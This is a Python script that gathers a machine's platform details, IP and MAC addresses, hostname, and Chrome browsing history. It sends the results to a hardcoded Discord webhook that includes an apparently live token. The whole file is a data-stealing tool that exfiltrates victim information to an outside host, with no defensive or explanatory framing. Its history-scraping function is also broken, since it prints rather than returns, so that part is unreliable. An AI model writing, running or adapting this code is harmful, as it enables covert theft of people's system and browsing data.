import platform
import netifaces
import socket
import requests
import pyautogui
import webdriver_manager.chrome
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.common.keys import Keys



def get_platform_info():
    return {
        'system': platform.system(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
    }


def get_network_info():
    ip_addresses = []
    mac_addresses = []

    for iface in netifaces.interfaces():
        try:
            addrs = netifaces.ifaddresses(iface)

            if netifaces.AF_INET in addrs:
                ip_addresses.append(addrs[netifaces.AF_INET][0]['addr'])

            if netifaces.AF_LINK in addrs:
                mac_addresses.append(addrs[netifaces.AF_LINK][0]['addr'])
        except ValueError:
            pass

    return {
        'ip_addresses': ip_addresses,
        'mac_addresses': mac_addresses,
    }


def get_hostname():
    return socket.gethostname()


def get_browser_history():
    driver = webdriver.Chrome(ChromeDriverManager().install())
    driver.get("chrome://history/")

    for entry in driver.find_elements_by_xpath("//*[@id='history']/div[1]/div[1]/div/div[1]"):
        url = entry.get_attribute("href")
        print(url)

    driver.quit()
    
    

def send_to_discord(webhook_url, message):
    data = {"content": message}
    requests.post('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', json=data)


if __name__ == '__main__':
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', "Platform Information: ")
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', str(get_platform_info()))

    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', "\nNetwork Information: ")
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', str(get_network_info()))

    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', "\nHostname: ")
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S', str(get_hostname()))
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S',"\nBrowserHistory: ")
    send_to_discord('https://discord.com/api/webhooks/1161277821654667385/Y58xLbu4ESmUs3GQ_KlM9LJyq45w94CNZGB0W4eHRoBS-NnyGx6E6PyxCOzGkOuvJA_S',str(get_browser_history()))